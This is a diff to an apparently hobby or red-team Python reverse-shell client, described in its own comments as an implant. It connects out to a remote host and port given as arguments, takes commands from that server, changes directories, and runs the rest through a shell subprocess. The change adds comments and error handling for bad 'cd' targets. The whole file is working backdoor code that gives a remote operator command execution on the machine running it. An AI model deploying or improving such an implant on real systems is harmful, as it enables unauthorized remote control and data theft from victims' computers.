@@ -10,7 +10,7 @@ parser.add_argument('-p', type=int, required=True, help='Input the remote port '
 args = parser.parse_args()
 
 
-def inbound_comm():
+def inbound_comm(): # Handle inbound comunications and decode to str from bytes
     print(f'[+] Awaiting response from server...')
     message = ''
     while True:
@@ -21,11 +21,11 @@ def inbound_comm():
             print(f'[-] An exception occured')
             sock.close()
 
-def outbound_comm(message):
+def outbound_comm(message): #Handle outgoing comms - sending response to server 
     response = str(message).encode()
     sock.send(response)
 
-def session_handler():
+def session_handler(): # Handle the sessions, connections, port etc - handle implate functionality as well
     print(f'[+] Trying to connect to {host_ip}')
     sock.connect((host_ip,host_port))
     print(f'[+] Connected to {host_ip}')
@@ -39,11 +39,16 @@ def session_handler():
             break
         
         elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
-            directory = str(message.split(" ")[1])
-            os.chdir(directory)
-            cur_dir = os.getcwd()
-            print(f'[+] Changed dir to {cur_dir}')
-            sock.send(cur_dir.encode())
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed dir to {cur_dir}')
+                sock.send(cur_dir.encode())
+            except FileNotFoundError:
+                outbound_comm('[-] Directory not found')
+                continue
+            
         else:
             #subprocess shell handling
             command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
